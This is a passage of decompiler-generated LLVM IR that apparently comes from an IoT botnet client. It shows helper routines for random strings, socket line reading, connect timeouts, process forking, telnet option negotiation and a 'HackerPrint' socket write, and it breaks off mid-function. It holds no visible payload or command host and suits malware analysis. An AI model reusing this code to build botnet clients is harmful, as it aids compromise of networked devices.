  %v2_982c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9840 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c3c8.48, i32 0, i32 0), i32 0)
  %v1_9860 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98bc

dec_label_pc_9850:                                ; preds = %dec_label_pc_98bc
  %v2_9860 = call i32 @uppercase(i8* %v1_9860)
  %v4_9878 = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c3d8.50, i32 0, i32 0))
  %v9_988c = icmp eq i32 %v4_9878, %v2_982c
  br i1 %v9_988c, label %dec_label_pc_9894, label %dec_label_pc_98a0

dec_label_pc_9894:                                ; preds = %dec_label_pc_9850
  %v1_9898 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9850, %dec_label_pc_9894
  %stack_var_-24.0 = phi i32 [ %v1_9898, %dec_label_pc_9894 ], [ %stack_var_-24.1, %dec_label_pc_9850 ]
  store i32 4096, i32* @r2, align 4
  %v3_98b8 = call i32 @__GI_memset(i8* %v1_9860, i32 0)
  br label %dec_label_pc_98bc

dec_label_pc_98bc:                                ; preds = %entry, %dec_label_pc_98a0
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_98a0 ]
  %v4_98d4 = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v4_9840, i32 %v2_982c)
  %v2_98dc = icmp eq i32 %v4_98d4, 0
  br i1 %v2_98dc, label %dec_label_pc_98e4, label %dec_label_pc_9850

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98bc
  %v1_98e8 = call i32 @__libc_close(i32 %v4_9840)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9908 = load i32, i32* @r4, align 4
  %v6_9908 = load i32, i32* @fp, align 4
  %v0_9914 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_998017 = icmp sgt i32 %arg2, 0
  br i1 %v5_998017, label %dec_label_pc_9930, label %dec_label_pc_9984

dec_label_pc_9930:                                ; preds = %entry, %dec_label_pc_9930
  %storemerge118 = phi i32 [ %v1_996c, %dec_label_pc_9930 ], [ 0, %entry ]
  %v2_993c = add i32 %storemerge118, %v0_9914
  store i32 %v2_993c, i32* @r4, align 4
  %v0_9940 = call i32 @rand_cmwc()
  %v2_9950 = urem i32 %v0_9940, 26
  store i32 %v2_9950, i32* %r0.global-to-local, align 4
  %v1_995c = add nuw nsw i32 %v2_9950, 65
  %v1_9964 = trunc i32 %v1_995c to i8
  %v2_9964 = load i32, i32* @r4, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_996c = add i32 %storemerge118, 1
  %v3_9978.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9980 = icmp slt i32 %v1_996c, %v3_9978.pre
  br i1 %v5_9980, label %dec_label_pc_9930, label %dec_label_pc_9974.dec_label_pc_9984_crit_edge

dec_label_pc_9974.dec_label_pc_9984_crit_edge:    ; preds = %dec_label_pc_9930
  %v12_9988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9974.dec_label_pc_9984_crit_edge, %entry
  %v12_9988 = phi i32 [ %v12_9988.pre, %dec_label_pc_9974.dec_label_pc_9984_crit_edge ], [ %v0_9914, %entry ]
  store i32 %v3_9908, i32* @r4, align 4
  store i32 %v6_9908, i32* @fp, align 4
  ret i32 %v12_9988

; uselistorder directives
  uselistorder i32 %v1_996c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99e0.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9990 = load i32, i32* @fp, align 4
  store i32 %v3_9990, i32* %stack_var_-16, align 4
  store i32 39320, i32* %stack_var_-4, align 4
  %v2_9994 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9994, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99cc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99e0.lr.ph, %dec_label_pc_99e0
  %storemerge527 = phi i32 [ 0, %dec_label_pc_99e0.lr.ph ], [ %v1_99f4, %dec_label_pc_99e0 ]
  %v5_99ec = mul nuw nsw i32 %storemerge527, 4
  %v6_99ec = add i32 %v5_99ec, %v2_99cc
  %v7_99ec = inttoptr i32 %v6_99ec to i32*
  store i32 0, i32* %v7_99ec, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_99f4, 32
  br i1 %tmp52, label %dec_label_pc_99e0, label %dec_label_pc_9a08

dec_label_pc_9a08:                                ; preds = %dec_label_pc_99e0
  %v13_9990 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a0c = udiv i32 %arg1, 32
  %v3_9a18 = mul nuw nsw i32 %v3_9a0c, 4
  %v2_9a20 = add nsw i32 %v3_9a18, -160
  %v2_9a24 = add i32 %v2_9a20, %v13_9990
  %v1_9a28 = inttoptr i32 %v2_9a24 to i32*
  %v2_9a28 = load i32, i32* %v1_9a28, align 4
  %v1_9a30 = urem i32 %arg1, 32
  %v6_9a38 = shl i32 1, %v1_9a30
  %v2_9a3c = or i32 %v2_9a28, %v6_9a38
  store i32 %v2_9a3c, i32* %v1_9a28, align 4
  %v1_9a5c = add i32 %arg1, 1
  %v2_9a68 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a7c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9a90 = icmp sgt i32 %v5_9a7c, 0
  br i1 %v5_9a90, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b90.preheader

dec_label_pc_9b90.preheader:                      ; preds = %dec_label_pc_9a08
  %v7_9b9823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9b9823, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9ad0.lr.ph:                          ; preds = %dec_label_pc_9b90.preheader, %dec_label_pc_9b84
  %stack_var_-44.024 = phi i32 [ %v1_9b88, %dec_label_pc_9b84 ], [ %tmp33, %dec_label_pc_9b90.preheader ]
  %v2_9a9c = load i32, i32* @global_var_28c44.54, align 4
  %v3_9aa8 = call i32 @HackerPrint(i32 %v2_9a9c, i32 ptrtoint ([5 x i8]* @global_var_1c3e4.56 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ad0.lr.ph, %dec_label_pc_9ad0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9ad0.lr.ph ], [ %v1_9ae4, %dec_label_pc_9ad0 ]
  %v5_9adc = mul nuw nsw i32 %storemerge615, 4
  %v6_9adc = add i32 %v5_9adc, %v2_99cc
  %v7_9adc = inttoptr i32 %v6_9adc to i32*
  store i32 0, i32* %v7_9adc, align 4
  %v1_9ae4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9ae4, 32
  br i1 %tmp53, label %dec_label_pc_9ad0, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0
  %v2_9b18 = load i32, i32* %v1_9a28, align 4
  %v2_9b2c = or i32 %v2_9b18, %v6_9a38
  store i32 %v2_9b2c, i32* %v1_9a28, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b6c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9b80 = icmp sgt i32 %v5_9b6c, 0
  br i1 %v5_9b80, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9af8
  %v1_9b88 = add nsw i32 %stack_var_-44.024, 1
  %v7_9b98 = icmp slt i32 %v1_9b88, 10
  br i1 %v7_9b98, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9c24.preheader:                      ; preds = %dec_label_pc_9b84, %dec_label_pc_9af8, %dec_label_pc_9b90.preheader, %dec_label_pc_9a08
  %v5_9bcc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c2c57 = icmp sgt i32 %arg3, 1
  %v2_9c4459 = icmp eq i1 %not.v7_9c2c57, false
  br i1 %v2_9c4459, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9c24.preheader, %dec_label_pc_9c18
  %v1_9c2862.in = phi i32 [ %v1_9c2862, %dec_label_pc_9c18 ], [ %arg3, %dec_label_pc_9c24.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9c08, %dec_label_pc_9c18 ], [ %arg2, %dec_label_pc_9c24.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9c1c, %dec_label_pc_9c18 ], [ 0, %dec_label_pc_9c24.preheader ]
  %v1_9c2862 = add i32 %v1_9c2862.in, -1
  %v2_9bb4 = load i32, i32* @global_var_28c44.54, align 4
  %v6_9bcc = call i32 @__libc_recv(i32 %v2_9bb4, i32* %v5_9bcc, i32 1, i32 0, i32 %v1_9c2862)
  %v7_9bd4 = icmp eq i32 %v6_9bcc, 1
  br i1 %v7_9bd4, label %dec_label_pc_9bf4, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bb0
  %v3_9bf4 = load i8, i8* %stack_var_-185, align 1
  %v4_9bf8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9bf4, i8* %stack_var_-40.061, align 1
  %v1_9c04 = add i32 %v4_9bf8, 1
  %v5_9c08 = inttoptr i32 %v1_9c04 to i8*
  %v3_9c0c = load i8, i8* %stack_var_-185, align 1
  %v7_9c10 = icmp eq i8 %v3_9c0c, 10
  br i1 %v7_9c10, label %dec_label_pc_9c4c, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bf4
  %v1_9c1c = add i32 %stack_var_-36.060, 1
  %not.v7_9c2c = icmp sgt i32 %v1_9c2862, 1
  %v2_9c44 = icmp eq i1 %not.v7_9c2c, false
  br i1 %v2_9c44, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9c24.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c24.preheader ], [ %v1_9c1c, %dec_label_pc_9c18 ], [ %stack_var_-36.060, %dec_label_pc_9bf4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c24.preheader ], [ %v5_9c08, %dec_label_pc_9c18 ], [ %v5_9c08, %dec_label_pc_9bf4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9bdc, %dec_label_pc_9c4c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bdc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c4c ]
  %v2_9c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c6c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c2862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_99cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c60, { 1, 0 }
  uselistorder label %dec_label_pc_9c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40068, i32* %stack_var_-4, align 4
  %v2_9c80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c80, i32* @fp, align 4
  %v1_9c94 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9ca4 = icmp eq i32 %v1_9c94, 0
  br i1 %v2_9ca4, label %dec_label_pc_9cac, label %dec_label_pc_9cc0

dec_label_pc_9cac:                                ; preds = %entry
  %v3_9cb0 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c3ec.58, i32 0, i32 0))
  br label %dec_label_pc_9d38

dec_label_pc_9cc0:                                ; preds = %entry
  %v1_9cc4 = add i32 %v1_9c94, 16
  %v2_9cc4 = inttoptr i32 %v1_9cc4 to i32*
  %v3_9cc4 = load i32, i32* %v2_9cc4, align 4
  %v1_9ce8 = inttoptr i32 %v3_9cc4 to i32*
  %v2_9ce8 = load i32, i32* %v1_9ce8, align 4
  %v2_9cec = icmp eq i32 %v2_9ce8, 0
  br i1 %v2_9cec, label %dec_label_pc_9d30, label %dec_label_pc_9cf4

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9cc0
  %v2_9d08 = load i32, i32* %v1_9ce8, align 4
  %v1_9d0c = inttoptr i32 %v2_9d08 to i32*
  %v2_9d0c = load i32, i32* %v1_9d0c, align 4
  store i32 %v2_9d0c, i32* @r0, align 4
  %v1_9d10 = call i32 @__GI_inet_ntoa(i32 %v2_9d0c)
  %v2_9d20 = inttoptr i32 %v1_9d10 to i8*
  %v3_9d20 = call i32 @strcpy(i32 %arg2, i8* %v2_9d20)
  br label %dec_label_pc_9d38

dec_label_pc_9d30:                                ; preds = %dec_label_pc_9cc0
  br label %dec_label_pc_9d38

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9cf4, %dec_label_pc_9cac, %dec_label_pc_9d30
  %v3_9d38 = phi i32 [ 0, %dec_label_pc_9cf4 ], [ 1, %dec_label_pc_9cac ], [ 1, %dec_label_pc_9d30 ]
  ret i32 %v3_9d38

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9d38, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d50 = load i32, i32* @fp, align 4
  store i32 %v3_9d50, i32* %stack_var_-16, align 4
  %v13_9d50 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9d78 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9d88 = or i32 %v2_9d78, 2048
  store i32 %v1_9d88, i32* @r2, align 4
  %v2_9d9c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9db8 = urem i32 %arg3, 65536
  %v1_9dc0 = call i32 @htons(i32 %v3_9db8)
  %v3_9de8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9df0 = icmp eq i32 %v3_9de8, 0
  br i1 %v2_9df0, label %dec_label_pc_9e04, label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %entry
  br label %dec_label_pc_9fbc

dec_label_pc_9e04:                                ; preds = %entry
  %v3_9e2c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e2c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e2c, i32 16)
  %v1_9e3c = icmp slt i32 %v4_9e2c, 0
  br i1 %v1_9e3c, label %dec_label_pc_9e44, label %dec_label_pc_9f80

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9e04
  %v0_9e44 = call i32 @__errno_location()
  %v1_9e4c = inttoptr i32 %v0_9e44 to i32*
  %v2_9e4c = load i32, i32* %v1_9e4c, align 4
  %v7_9e50 = icmp eq i32 %v2_9e4c, 115
  br i1 %v7_9e50, label %dec_label_pc_9e7c.lr.ph, label %dec_label_pc_9f74

dec_label_pc_9e7c.lr.ph:                          ; preds = %dec_label_pc_9e44
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9e68 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9e7c

dec_label_pc_9e7c:                                ; preds = %dec_label_pc_9e7c.lr.ph, %dec_label_pc_9e7c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9e7c.lr.ph ], [ %v1_9e90, %dec_label_pc_9e7c ]
  %v5_9e88 = mul nuw nsw i32 %storemerge14, 4
  %v6_9e88 = add i32 %v5_9e88, %v2_9e68
  %v7_9e88 = inttoptr i32 %v6_9e88 to i32*
  store i32 0, i32* %v7_9e88, align 4
  %v1_9e90 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9e90, 32
  br i1 %tmp32, label %dec_label_pc_9e7c, label %dec_label_pc_9ea4

dec_label_pc_9ea4:                                ; preds = %dec_label_pc_9e7c
  %v3_9ea8 = udiv i32 %arg1, 32
  %v3_9eb4 = mul nuw nsw i32 %v3_9ea8, 4
  %v2_9ebc = add nsw i32 %v3_9eb4, -160
  %v2_9ec0 = add i32 %v2_9ebc, %v13_9d50
  %v1_9ec4 = inttoptr i32 %v2_9ec0 to i32*
  %v2_9ec4 = load i32, i32* %v1_9ec4, align 4
  %v1_9ecc = urem i32 %arg1, 32
  %v6_9ed4 = shl i32 1, %v1_9ecc
  %v2_9ed8 = or i32 %v2_9ec4, %v6_9ed4
  store i32 %v2_9ed8, i32* %v1_9ec4, align 4
  %v1_9ef8 = add i32 %arg1, 1
  %v2_9f00 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f18 = call i32 @__libc_select(i32 %v1_9ef8, i32 0, i32 %v2_9e68, i32 0, i32 %v2_9f00)
  %tmp33 = icmp slt i32 %v5_9f18, 1
  br i1 %tmp33, label %dec_label_pc_9f68, label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %dec_label_pc_9ea4
  %v0_9f4c = call i32 @getsockopt()
  %v3_9f50 = load i32, i32* %stack_var_-192, align 4
  %v2_9f54 = icmp eq i32 %v3_9f50, 0
  br i1 %v2_9f54, label %dec_label_pc_9f80, label %dec_label_pc_9f5c

dec_label_pc_9f5c:                                ; preds = %dec_label_pc_9f28
  br label %dec_label_pc_9fbc

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9ea4
  br label %dec_label_pc_9fbc

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9e44
  br label %dec_label_pc_9fbc

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9e04, %dec_label_pc_9f28
  store i32 0, i32* @r2, align 4
  %v2_9f8c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9f9c = and i32 %v2_9f8c, -2049
  store i32 %v1_9f9c, i32* @r2, align 4
  %v2_9fb0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_9fbc

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9f74, %dec_label_pc_9f68, %dec_label_pc_9f5c, %dec_label_pc_9df8, %dec_label_pc_9f80
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9f68 ], [ 1, %dec_label_pc_9f80 ], [ 0, %dec_label_pc_9f5c ], [ 0, %dec_label_pc_9f74 ], [ 0, %dec_label_pc_9df8 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9e68, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_9fbc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9f80, { 1, 0 }
  uselistorder label %dec_label_pc_9e7c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9fcc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9fcc, i32* @ip, align 4
  %v3_9fd0 = load i32, i32* @r4, align 4
  %v6_9fd0 = load i32, i32* @r5, align 4
  %v9_9fd0 = load i32, i32* @r6, align 4
  %v0_9fdc = call i32 @__libc_fork()
  %v2_9fec = icmp eq i32 %v0_9fdc, 0
  br i1 %v2_9fec, label %dec_label_pc_a14c, label %dec_label_pc_a000

dec_label_pc_a000:                                ; preds = %entry
  %v2_a004 = load i32, i32* @global_var_28c48.60, align 4
  %v5_a004 = load i32, i32* @global_var_28c4c.61, align 4
  %v2_a010 = add i32 %v2_a004, 1
  %v3_a010 = icmp eq i32 %v2_a010, 0
  %v4_a014 = zext i1 %v3_a010 to i32
  %v5_a014 = add i32 %v4_a014, %v5_a004
  store i32 %v2_a010, i32* @global_var_28c48.60, align 4
  store i32 %v5_a014, i32* @global_var_28c4c.61, align 4
  %v3_a028 = udiv i32 %v2_a010, 1073741824
  %v3_a02c = mul i32 %v5_a014, 4
  %v2_a030 = or i32 %v3_a02c, %v3_a028
  store i32 %v2_a030, i32* @r4, align 4
  %v3_a034 = mul i32 %v2_a010, 4
  %v1_a038 = add i32 %v3_a034, 4
  %v1_a040 = call i32 @malloc(i32 %v1_a038)
  br label %dec_label_pc_a098

dec_label_pc_a058:                                ; preds = %dec_label_pc_a098, %dec_label_pc_a0e4
  %v3_a05c = mul i32 %storemerge2, 4
  %v2_a068 = add i32 %v3_a05c, %v1_a040
  %v2_a07c = load i32, i32* @global_var_2eec8.63, align 4
  %v2_a080 = add i32 %v2_a07c, %v3_a05c
  %v1_a084 = inttoptr i32 %v2_a080 to i32*
  %v2_a084 = load i32, i32* %v1_a084, align 4
  %v2_a088 = inttoptr i32 %v2_a068 to i32*
  store i32 %v2_a084, i32* %v2_a088, align 4
  %v1_a090 = add i32 %storemerge2, 1
  br label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a000, %dec_label_pc_a058
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a000 ], [ %v1_a090, %dec_label_pc_a058 ]
  %v2_a0b0 = load i32, i32* @global_var_28c48.60, align 4
  %v5_a0b0 = load i32, i32* @global_var_28c4c.61, align 4
  %v2_a0c4 = add i32 %v2_a0b0, -1
  %v3_a0c4 = icmp ne i32 %v2_a0b0, 0
  %v3_a0c8 = add i32 %v5_a0b0, -1
  %v5_a0c8 = sext i1 %v3_a0c4 to i32
  %v9_a0dc = icmp eq i32 %v3_a0c8, %v5_a0c8
  br i1 %v9_a0dc, label %dec_label_pc_a0e4, label %dec_label_pc_a058

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a098
  store i32 %v2_a0c4, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a0c4, %storemerge2
  br i1 %tmp, label %dec_label_pc_a058, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0e4
  store i32 %v5_a0b0, i32* @r4, align 4
  %v3_a10c = mul i32 %v2_a0b0, 4
  %v2_a118 = add i32 %v1_a040, -4
  %v1_a11c = add i32 %v2_a118, %v3_a10c
  %v2_a124 = inttoptr i32 %v1_a11c to i32*
  store i32 %v0_9fdc, i32* %v2_a124, align 4
  %v2_a12c = load i32, i32* @global_var_2eec8.63, align 4
  %v1_a134 = call i32 @free(i32 %v2_a12c)
  store i32 ptrtoint (i32* @global_var_2eec8.63 to i32), i32* @r2, align 4
  store i32 %v1_a040, i32* @global_var_2eec8.63, align 4
  br label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %entry, %dec_label_pc_a104
  store i32 %v3_9fd0, i32* @r4, align 4
  store i32 %v6_9fd0, i32* @r5, align 4
  store i32 %v9_9fd0, i32* @r6, align 4
  ret i32 %v0_9fdc

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a05c, { 1, 0 }
  uselistorder i32 %v1_a040, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a14c, { 1, 0 }
  uselistorder label %dec_label_pc_a098, { 1, 0 }
  uselistorder label %dec_label_pc_a058, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a184 = add i32 %arg2, 1
  %v1_a188 = inttoptr i32 %v1_a184 to i8*
  %v2_a188 = load i8, i8* %v1_a188, align 1
  %v7_a194 = icmp ult i8 %v2_a188, -5
  br i1 %v7_a194, label %dec_label_pc_a2e0, label %dec_label_pc_a19c

dec_label_pc_a19c:                                ; preds = %entry
  %v7_a1a4 = icmp eq i8 %v2_a188, -1
  br i1 %v7_a1a4, label %dec_label_pc_a1a8, label %dec_label_pc_a1c4

dec_label_pc_a1a8:                                ; preds = %dec_label_pc_a19c
  br label %dec_label_pc_a2e0

dec_label_pc_a1c4:                                ; preds = %dec_label_pc_a19c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a1e0 = bitcast i8* %stack_var_-17 to i32*
  %v6_a1e0 = call i32 @__libc_send(i32 %arg1, i32* %v5_a1e0, i32 1, i32 16384)
  %v2_a1ec = load i8, i8* %v1_a188, align 1
  %v7_a1f0 = icmp eq i8 %v2_a1ec, -4
  br i1 %v7_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a204

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1c4
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1c4
  %v2_a20c = load i8, i8* %v1_a188, align 1
  %v7_a210 = icmp eq i8 %v2_a20c, -2
  br i1 %v7_a210, label %dec_label_pc_a218, label %dec_label_pc_a224

dec_label_pc_a218:                                ; preds = %dec_label_pc_a204
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a224:                                ; preds = %dec_label_pc_a204
  %v2_a22c = load i8, i8* %v1_a188, align 1
  %v7_a230 = icmp eq i8 %v2_a22c, 3
  %v7_a244 = icmp eq i8 %v2_a22c, -3
  br i1 %v7_a230, label %dec_label_pc_a238, label %dec_label_pc_a270

dec_label_pc_a238:                                ; preds = %dec_label_pc_a224
  br i1 %v7_a244, label %dec_label_pc_a24c, label %dec_label_pc_a258

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a238
  br label %dec_label_pc_a260

dec_label_pc_a258:                                ; preds = %dec_label_pc_a238
  br label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a24c, %dec_label_pc_a258
  %storemerge = phi i8 [ -3, %dec_label_pc_a258 ], [ -5, %dec_label_pc_a24c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a270:                                ; preds = %dec_label_pc_a224
  br i1 %v7_a244, label %dec_label_pc_a284, label %dec_label_pc_a290

dec_label_pc_a284:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a298

dec_label_pc_a290:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a284, %dec_label_pc_a290
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a290 ], [ -4, %dec_label_pc_a284 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a260, %dec_label_pc_a218, %dec_label_pc_a1f8, %dec_label_pc_a298
  %v5_a2b8 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a1e0, i32 1, i32 16384)
  %v1_a2c0 = add i32 %arg2, 2
